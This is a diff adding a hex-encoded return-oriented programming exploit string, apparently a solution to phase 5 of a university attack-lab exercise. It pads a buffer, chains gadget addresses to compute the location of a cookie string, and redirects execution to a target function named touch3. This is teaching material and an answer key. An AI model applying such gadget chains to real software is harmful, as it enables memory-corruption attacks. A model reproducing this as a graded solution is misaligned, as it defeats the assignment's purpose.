@@ -1,0 +1,25 @@
+/* Code Injection for Phase 5 */
+
+/* As always, pad buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Begin gadget calls */
+a3 1b 40 00 00 00 00 00		/* mov %rsp,%rax */
+e2 1b 40 00 00 00 00 00 	/* mov %rax,%rdx */
+b8 1b 40 00 00 00 00 00 	/* mov %rdx,%rcx */
+02 1b 40 00 00 00 00 00 	/* mov %rcx,%rsi */
+1b 1b 40 00 00 00 00 00		/* popq %rax */
+19 00 00 00 00 00 00 00		/* offset from %rsp for cookie string */
+2d 1b 40 00 00 00 00 00 	/* mov %rax,%rdi */
+4c 1b 40 00 00 00 00 00 	/* add_xy(%rdi,%rsi) --> %rax */
+2d 1b 40 00 00 00 00 00		/* mov %rax,%rdi */
+
+74 1a 40 00 00 00 00 00		/* Addr. of touch3 */
+
+/* Finally pass in string representation of our cookie */
+37 30 32 30 36 62 37 37 00
+
